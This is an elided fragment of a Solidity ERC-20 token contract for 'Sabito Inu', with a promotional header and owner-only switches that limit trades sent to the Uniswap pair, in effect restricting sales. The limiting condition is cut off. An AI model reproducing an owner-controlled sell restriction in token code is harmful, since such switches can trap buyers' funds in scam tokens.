...
SABITO INU
https://sabitoinu.com
Sabito Inu ($Sabito) It will be a trend-leading animation project on the Ethereum blockchain!
*/
...
contract SabitoInu is Context, IERC20, Ownable {
    ...
    function limittradesStatus(bool _state) public onlyOwner {
        _limittrades = _state;
    ...
    function changelimittradesTime(uint256 _time) public onlyOwner {
    ...
    function _transfer(
        ...
        } else if (_limittrades && to == uniswapV2Pair) {
            require(
